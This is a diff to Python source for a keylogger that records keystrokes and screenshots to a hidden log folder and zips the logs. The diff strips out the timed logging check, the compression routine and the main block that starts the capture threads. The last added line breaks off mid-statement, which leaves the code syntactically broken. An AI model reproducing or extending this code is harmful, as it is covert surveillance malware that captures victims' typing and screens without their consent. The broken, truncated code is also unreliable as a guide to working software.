@@ -12,7 +12,8 @@ import win32gui
 import win32process
 import zipfile
 import pyscreenshot as ImageGrab
-from aes_key_generator import aes_key
+import random
+import hashlib
 
 LOG_DIR = os.path.join(os.getenv("APPDATA") if os.name == "nt" else os.getenv("HOME"), "Keylogger")
 LOG_INTERVAL = 60  # Default log interval in seconds
@@ -134,35 +135,4 @@ def start_keylogger():
             listener.join()
     except Exception as e:
         with open("error_log.txt", "a") as error_file:
-            error_file.write(f"Error starting keylogger: {e}\n")
-
-# Function to periodically check if it's time to log keystrokes
-def check_log_time():
-    global LAST_LOG_TIME
-    while True:
-        if time.time() - LAST_LOG_TIME >= CONFIG['log_interval']:
-            write_to_file(" ")
-        time.sleep(1)
-
-# Function to compress logged data
-def compress_logs():
-    try:
-        with zipfile.ZipFile(os.path.join(LOG_DIR, "logs.zip"), 'w') as zipf:
-            for root, dirs, files in os.walk(LOG_DIR):
-                for file in files:
-                    zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), LOG_DIR))
-    except Exception as e:
-        with open("error_log.txt", "a") as error_file:
-            error_file.write(f"Error compressing logs: {e}\n")
-
-if __name__ == "__main__":
-    # Start the keylogger
-    start_keylogger()
-    # Start the thread to check log time periodically
-    threading.Thread(target=check_log_time, daemon=True).start()
-    # Start the thread to capture screenshots
-    if CONFIG['screenshot_capture']:
-        threading.Thread(target=capture_screenshot, daemon=True).start()
-    # Start the thread to compress logs
-    if CONFIG['compression']:
-        threading.Thread(target=compress_logs, daemon=True).start()
+            error_file.write(f"Error starting keylogger: {
